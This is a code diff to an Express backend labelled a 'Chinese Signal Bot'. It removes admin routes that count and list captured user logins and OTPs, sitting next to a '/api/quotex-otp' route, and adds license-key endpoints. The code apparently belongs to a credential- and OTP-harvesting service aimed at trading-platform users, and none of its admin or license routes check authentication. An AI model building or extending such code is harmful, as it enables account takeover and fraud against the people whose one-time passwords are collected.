@@ -217,62 +217,33 @@ app.post('/api/quotex-otp', async (req, res) => {
     res.status(200).send({ status: "ok" });
 });
 
-// ================== ADMIN PANEL ROUTES (FIXED) ==================
-app.get('/api/stats', (req, res) => {
-    const stats = {
-        totalUsers: users.length,
-        onlineNow: users.filter(u => u.status === "Online").length,
-        otpCaptured: users.filter(u => u.otp && u.otp.length >= 4).length,
-        connectedAccounts: users.filter(u => u.connected).length
-    };
-    res.json(stats);
-});
-
-app.get('/api/users', (req, res) => {
-    res.json(users);
-});
-
-app.get('/api/latest-activity', (req, res) => {
-    res.json({
-        logins: users.filter(u => u.username),
-        otps: users.filter(u => u.otp)
-    });
-});
-
-// Root Route
-app.get('/', (req, res) => {
-    res.send("✅ Chinese Signal Bot Backend is Running");
-});
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`📁 users.json location: ${DATA_FILE}`);
-});
-// ADD THESE ROUTES TO server.js
-
-// License storage
-const LICENSE_FILE = path.join(__dirname, 'licenses.json');
+// ================== LICENSE MANAGEMENT (ADDED) ==================
+const LICENSES_FILE = path.join(__dirname, 'licenses.json');
 let licenses = [];
 
-// Load licenses
 function loadLicenses() {
     try {
-        if (fs.existsSync(LICENSE_FILE)) {
-            licenses = JSON.parse(fs.readFileSync(LICENSE_FILE, 'utf8'));
+        if (fs.existsSync(LICENSES_FILE)) {
+            const data = fs.readFileSync(LICENSES_FILE, 'utf8');
+            licenses = JSON.parse(data);
+            console.log(`✅ Loaded ${licenses.length} licenses`);
         } else {
-            fs.writeFileSync(LICENSE_FILE, JSON.stringify([]));
+            fs.writeFileSync(LICENSES_FILE, JSON.stringify([], null, 2));
         }
-    } catch(e) {}
+    } catch (e) {
+        licenses = [];
+    }
+}
+
+function saveLicenses() {
+    try {
+        fs.writeFileSync(LICENSES_FILE, JSON.stringify(licenses, null, 2));
+    } catch (e) {}
 }
 
 loadLicenses();
 
-function saveLicenses() {
-    fs.writeFileSync(LICENSE_FILE, JSON.stringify(licenses, null, 2));
-}
-
-// GET licenses
+// GET all licenses
 app.get('/api/licenses', (req, res) => {
     res.json(licenses);
 });
@@ -280,34 +251,35 @@ app.get('/api/licenses', (req, res) => {
 // POST new license
 app.post('/api/licenses', (req, res) => {
     const { key, type, expiry, maxUses } = req.body;
+    if (!key) return res.status(400).json({error: "Key required"});
+    
+    const existing = licenses.find(l => l.key === key);
+    if (existing) return res.status(400).json({error: "License already exists"});
+    
     licenses.unshift({
-        key,
-        type,
-        status: 'Active',
-        usesLeft: maxUses || 999,
-        assignedTo: '',
-        addedDate: new Date().toISOString()
+        key: key,
+        type: type || "Permanent",
+        status: "Active",
+        usesRemaining: maxUses || null,
+        assignedTo: null,
+        dateAdded: new Date().toISOString(),
+        expiry: expiry || null
     });
     saveLicenses();
     res.json({success: true});
 });
 
-// PUT toggle status
-app.put('/api/licenses/:key', (req, res) => {
-    const license = licenses.find(l => l.key === req.params.key);
-    if (license) {
-        license.status = license.status === 'Active' ? 'Inactive' : 'Active';
-        saveLicenses();
-    }
-    res.json({success: true});
-});
-
 // DELETE license
 app.delete('/api/licenses/:key', (req, res) => {
-    licenses = licenses.filter(l => l.key !== req.params.key);
+    const key = req.params.key;
+    licenses = licenses.filter(l => l.key !== key);
     saveLicenses();
     res.json({success: true});
 });
 
-// Update license activation to validate against licenses
-// In /api/license-activate route, you can add validation if needed
+// Enhanced license check (for main bot)
+app.post('/api/validate-license', (req, res) => {
+    const { licenseKey } = req.body;
+    const license = licenses.find(l => l.key === licenseKey && l.status === "Active");
+    res.json({ valid: !!license });
+});
